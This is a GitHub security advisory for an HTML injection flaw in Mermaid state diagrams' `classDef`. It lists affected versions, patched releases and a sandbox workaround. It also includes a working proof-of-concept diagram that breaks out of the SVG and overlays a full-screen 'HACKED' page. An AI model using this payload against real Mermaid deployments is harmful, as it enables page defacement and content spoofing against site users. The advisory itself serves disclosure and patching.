# [M] Mermaid: Improper sanitization of `classDef` in state diagrams leads to HTML injection

## Summary
Severity: Medium
Advisory: GHSA-ghcm-xqfw-q4vr
CVE: CVE-2026-41149
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:L/SI:L/SA:L (CVSS_V4)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-ghcm-xqfw-q4vr
Type: github-advisory

## Affected
- npm: `mermaid` — affected >=11.0.0-alpha.1 <11.15.0
- npm: `mermaid` — affected >=0 <10.9.6

## Details
### Impact

Under the default configuration, Mermaid state diagram's `classDef` allow DOM injection that escapes the SVG, although `<script>` tags are removed, preventing XSS.

#### Proof-of-concept

```
stateDiagram-v2
  classDef xss fill:red</style></svg><style>*{x:x;y:y;overflow:visible!important;contain:none!important;transform:none!important;filter:none!important;clip-path:none!important}</style><div style="x:x;y:y;color:red;font:5em/1 monospace;display:grid;place-items:center;z-index:2147483647;width:100vw;height:100vh;position:fixed;top:0;left:0;background:black">HACKED</div><svg><style>a:b
  [*] --> A:::xss
```

### Patches

- [v11.15.0](https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0) (see [37ff937f1da2e19f882fd1db01235db4d01f4056](https://github.com/mermaid-js/mermaid/commit/37ff937f1da2e19f882fd1db01235db4d01f4056))
- [v10.9.6](https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6) (see [4e2d512bf5bf6f9de1a8f0a48da78dc4d09ac4f3](https://github.com/mermaid-js/mermaid/commit/4e2d512bf5bf6f9de1a8f0a48da78dc4d09ac4f3))

### Workarounds

If you can not update to a patched version, setting [`"securityLevel": "sandbox"`](https://mermaid.js.org/config/schema-docs/config.html#securitylevel)  will prevent this, by rendering the mermaid diagram in a sandboxed `<iframe>`.

### Credits

Thanks to @zsxsoft from @KeenSecurityLab for reporting this vulnerability.

## References
- https://github.com/mermaid-js/mermaid/security/advisories/GHSA-ghcm-xqfw-q4vr
- https://nvd.nist.gov/vuln/detail/CVE-2026-41149
- https://github.com/mermaid-js/mermaid/commit/37ff937f1da2e19f882fd1db01235db4d01f4056
- https://github.com/mermaid-js/mermaid/commit/4e2d512bf5bf6f9de1a8f0a48da78dc4d09ac4f3
- https://github.com/mermaid-js/mermaid
- https://github.com/mermaid-js/mermaid/releases/tag/mermaid%4011.15.0
- https://github.com/mermaid-js/mermaid/releases/tag/v10.9.6
- https://mermaid.js.org/config/schema-docs/config.html#securitylevel
